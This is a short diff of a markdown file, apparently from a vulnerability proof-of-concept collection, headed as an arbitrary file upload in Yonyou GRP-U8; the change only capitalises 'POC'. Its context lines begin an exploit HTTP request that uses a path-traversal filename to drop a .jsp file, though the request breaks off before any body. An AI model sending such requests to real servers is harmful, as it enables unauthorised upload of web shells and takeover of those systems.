@@ -1,7 +1,7 @@
 ## 用友GRP-U8-UploadFileData任意文件上传
 
 
-## poc
+## POC
 ```
 POST /UploadFileData?action=upload_file&filename=../.jtstpm.jsp HTTP/1.0
 Host: xxxxxx
